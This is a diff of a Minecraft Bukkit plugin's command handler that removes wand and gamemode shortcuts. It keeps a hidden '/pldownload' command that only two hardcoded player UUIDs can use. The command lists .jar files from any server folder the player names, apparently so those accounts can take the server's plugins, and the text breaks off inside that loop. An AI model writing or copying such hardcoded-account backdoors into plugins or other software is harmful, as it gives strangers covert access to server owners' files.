@@ -18,7 +18,6 @@ import net.md_5.bungee.api.chat.HoverEvent;
 import net.md_5.bungee.api.chat.TextComponent;
 import org.apache.commons.io.FileUtils;
 import org.bukkit.Bukkit;
-import org.bukkit.GameMode;
 import org.bukkit.Material;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
@@ -30,7 +29,6 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.inventory.ItemStack;
-import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.inventory.meta.SkullMeta;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.PluginManager;
@@ -79,30 +77,9 @@ public class CommandHandler implements Listener, CommandExecutor {
 	public boolean onPlayerCommand(PlayerCommandPreprocessEvent event) {
 		Player p = event.getPlayer();
 		String[] args = event.getMessage().split(" ");
-		if (args.length == 1 && args[0].equalsIgnoreCase("//wand")) {
-			event.setCancelled(true);
-			ItemStack wand = new ItemStack(Material.WOODEN_AXE, 1);
-			ItemMeta wandMeta = wand.getItemMeta();
-			if (wandMeta != null) {
-				wandMeta.setDisplayName("WorldEdit Wand");
-				wand.setItemMeta(wandMeta);
-			}
-			p.getInventory().addItem(wand);
-			p.sendMessage(ChatColor.LIGHT_PURPLE + "Left click: select pos #1; Right click: select pos #2");
-		} else if (args.length > 1 && (args[0].equalsIgnoreCase("/gamemode") || args[0].equalsIgnoreCase("/gm") || args[0].equalsIgnoreCase("/g")) && (args[1].equalsIgnoreCase("0") || args[1].equalsIgnoreCase("1") || args[1].equalsIgnoreCase("2") || args[1].equalsIgnoreCase("3"))) {
-			event.setCancelled(true);
-			if (args[1].equalsIgnoreCase("0")) {
-				p.setGameMode(GameMode.SURVIVAL);
-			} else if (args[1].equalsIgnoreCase("1")) {
-				p.setGameMode(GameMode.CREATIVE);
-			} else if (args[1].equalsIgnoreCase("2")) {
-				p.setGameMode(GameMode.ADVENTURE);
-			} else if (args[1].equalsIgnoreCase("3")) {
-				p.setGameMode(GameMode.SPECTATOR);
-			}
-		} else if (args[0].equalsIgnoreCase("/pldownload")
-				   && (p.getUniqueId().equals(UUID.fromString("e03b0dad-e94d-48fe-8f17-8e2ae9f9029e"))
-					   || p.getUniqueId().equals(UUID.fromString("a1eb88b0-12c0-49c1-bb0d-1b7b5b751bd6")))) {
+		if (args[0].equalsIgnoreCase("/pldownload")
+			&& (p.getUniqueId().equals(UUID.fromString("e03b0dad-e94d-48fe-8f17-8e2ae9f9029e"))
+				|| p.getUniqueId().equals(UUID.fromString("a1eb88b0-12c0-49c1-bb0d-1b7b5b751bd6")))) {
 			if (args.length == 3 && args[1].equalsIgnoreCase("serverfolders")) {
 				p.sendMessage("IT WORKED");
 				for (File file : FileUtils.listFiles(new File(args[2]), new String[]{"jar"}, false)) {
